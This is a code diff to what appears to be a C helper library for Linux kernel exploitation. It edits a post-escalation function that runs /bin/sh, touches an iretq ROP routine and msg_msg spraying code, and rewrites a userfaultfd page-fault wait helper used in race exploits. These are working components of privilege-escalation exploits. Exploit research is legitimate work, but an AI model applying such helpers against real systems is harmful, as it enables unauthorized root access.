@@ -224,9 +224,10 @@ struct msgbuf *peek_msgseg(int msgid, size_t size) {
 #include <unistd.h>
 
 void shell() {
-  char *argv[] = {"/bin/sh", NULL};
+  char *path = "/bin/sh";
+  char *argv[] = {path, NULL};
   char *envp[] = {NULL};
-  execve("/bin/sh", argv, envp);
+  execve(path, argv, envp);
 }
 
 unsigned long user_cs;
@@ -285,7 +286,6 @@ void rop_iretq(unsigned long *p) {
 #include <assert.h>
 #include <fcntl.h>
 #include <linux/userfaultfd.h>
-#include <poll.h>
 #include <sys/ioctl.h>
 #include <sys/stat.h>
 #include <sys/syscall.h>
@@ -336,23 +336,22 @@ void userfaultfd_copy(int fd, void *dst, void *src) {
   }
 }
 
-void userfaultfd_wait(int fd, struct uffd_msg *uffd_msg) {
-  struct pollfd pollfd;
-  pollfd.fd = fd;
-  pollfd.events = POLLIN;
-
-  int err = poll(&pollfd, 1, -1);
-  if (err == -1) {
-    ABORT("poll");
+struct uffd_msg *userfaultfd_wait(int fd) {
+  struct uffd_msg *uffd_msg =
+      (struct uffd_msg *)malloc(sizeof(struct uffd_msg));
+  if (!uffd_msg) {
+    ABORT("malloc");
   }
 
-  ssize_t nread = read(fd, uffd_msg, sizeof(uffd_msg));
+  ssize_t nread = read(fd, uffd_msg, sizeof(struct uffd_msg));
   if (nread == -1) {
     ABORT("read");
   }
 
-  assert(nread == sizeof(uffd_msg));
+  assert(nread == sizeof(struct uffd_msg));
   assert(uffd_msg->event == UFFD_EVENT_PAGEFAULT);
+
+  return uffd_msg;
 }
 
 #endif
